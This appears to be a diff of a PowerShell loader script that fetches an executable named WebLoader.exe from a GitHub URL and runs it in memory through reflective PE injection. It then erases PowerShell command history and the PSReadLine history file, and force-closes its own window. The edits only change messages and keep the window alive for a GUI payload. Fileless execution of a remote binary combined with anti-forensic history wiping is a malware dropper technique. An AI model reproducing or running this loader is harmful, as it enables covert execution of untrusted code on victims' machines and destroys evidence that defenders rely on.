@@ -1,5 +1,5 @@
 # ===============================================
-# Run EXE from URL + Keep Console Open + Clear History
+# Run GUI EXE from URL in Memory + Keep Window Open + Clear History
 # ===============================================
 
 $Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
@@ -30,7 +30,7 @@ try {
     exit
 }
 
-Write-Host "[+] Injecting and running EXE in memory..." -ForegroundColor Green
+Write-Host "[+] Injecting GUI EXE in memory..." -ForegroundColor Green
 
 try {
     if ($Arguments) {
@@ -39,24 +39,27 @@ try {
         Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
     }
     
-    Write-Host "[+] Executed successfully" -ForegroundColor Green
-    Write-Host "`nPress any key to clear history and close this window..." -ForegroundColor Yellow
-    $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
+    Write-Host "[+] GUI Program launched successfully!" -ForegroundColor Green
+    Write-Host "`nThe program window should now appear." -ForegroundColor Yellow
+    Write-Host "This PowerShell window will stay open until you close the GUI program." -ForegroundColor Cyan
+    
+    # Keep PowerShell alive for GUI application
+    Write-Host "`nWaiting for program to run... (Press Ctrl+C to stop)" -ForegroundColor DarkGray
+    Start-Sleep -Seconds 3600   # Wait 1 hour (you can change this)
 
 } catch {
     Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
-    $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
+    Start-Sleep -Seconds 10
 }
 
 # ================== Clear PowerShell History ==================
 Write-Host "[+] Clearing PowerShell history..." -ForegroundColor DarkGray
 
 Clear-History -ErrorAction SilentlyContinue
-Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+if (Get-PSReadlineOption) {
+    Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+}
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-
-Write-Host "[+] History cleared" -ForegroundColor DarkGray
 
 # Close PowerShell
 Stop-Process -Id $PID -Force
